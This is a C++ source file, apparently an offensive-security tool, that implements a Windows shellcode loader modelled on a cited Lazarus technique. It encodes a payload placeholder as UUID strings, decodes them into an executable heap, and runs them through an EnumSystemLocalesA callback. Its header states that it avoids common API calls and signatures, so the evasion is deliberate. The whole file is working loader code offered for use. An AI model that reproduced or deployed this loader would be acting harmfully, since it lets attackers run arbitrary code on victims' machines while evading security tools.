/**
Author: Thomas X Meng
UUIDs Process Injection code, only one API call to EnumSystemLocalesA required. 
No virtual memory allocation, no permission settings, no CreateThread, no WriteProcessMemory
No UuidFromStringA, no RPCRT4.dll, no signatures
reference: NCC Group, 
https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
**/
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <cstdio>
#include <cstring>
#include <cstdlib>


#pragma comment(lib, "Rpcrt4.lib")

// Custom function to replace UuidFromStringA
void customUuidFromString(const char* uuidStr, unsigned char* bytes) {
    unsigned int data[16] = {0};
    sscanf(uuidStr, "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
           &data[3], &data[2], &data[1], &data[0], &data[5], &data[4], &data[7], &data[6],
           &data[8], &data[9], &data[10], &data[11], &data[12], &data[13], &data[14], &data[15]);

    for (int i = 0; i < 16; ++i) {
        bytes[i] = static_cast<unsigned char>(data[i]);
    }
}

// Function to convert a block of 16 bytes to a UUID-like string
void bytesToUuidString(const unsigned char *bytes, char *uuidString) {
    sprintf(uuidString,
            "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
            bytes[3], bytes[2], bytes[1], bytes[0],
            bytes[5], bytes[4], bytes[7], bytes[6],
            bytes[8], bytes[9], bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15]);
}

void convertToUuids(unsigned char *magiccode, int magiccodeLength, char uuids[][37]) {
    int uuidIndex = 0;
    for (int i = 0; i < magiccodeLength; i += 16) {
        bytesToUuidString(magiccode + i, uuids[uuidIndex++]);
    }
}

unsigned char magiccode[] = ####SHELLCODE####;


int main(int argc, char *argv[]) {
    // Define your magiccode here


    int magiccodeLength = sizeof(magiccode);
    int numUuids = (magiccodeLength + 15) / 16; // Calculate the number of UUIDs needed

    // Allocate memory for UUID strings
    char(*uuids)[37] = new char[numUuids][37]; 
    
    // Convert magiccode to UUIDs
    convertToUuids(magiccode, magiccodeLength, uuids);

    // Display UUIDs for verification
    for (int i = 0; i < numUuids; i++) {
        printf("%s\n", uuids[i]);
    }

    // Memory allocation for execution
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, numUuids * 16);
    unsigned char* hptr = (unsigned char*)ha;

    // Convert UUIDs back and copy them to the heap
    for (int i = 0; i < numUuids; i++) {
        unsigned char bytes[16];
        customUuidFromString(uuids[i], bytes);
        memcpy(hptr + (i * 16), bytes, 16);
    }

    // Hexdump of UUIDs for verification
    // printf("[*] Hexdump: ");
    // for (int i = 0; i < numUuids * 16; i++) {
    //     printf("%02X ", hptr[i]);
    // }
    // printf("\n");

    // Execute the magiccode
    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    printf("[+] Magiccode executed\n");

    // Cleanup
    CloseHandle(ha);
    delete[] uuids;

    Sleep(5000);
    // Terminate the process
    ExitProcess(0);

    return 0;
}
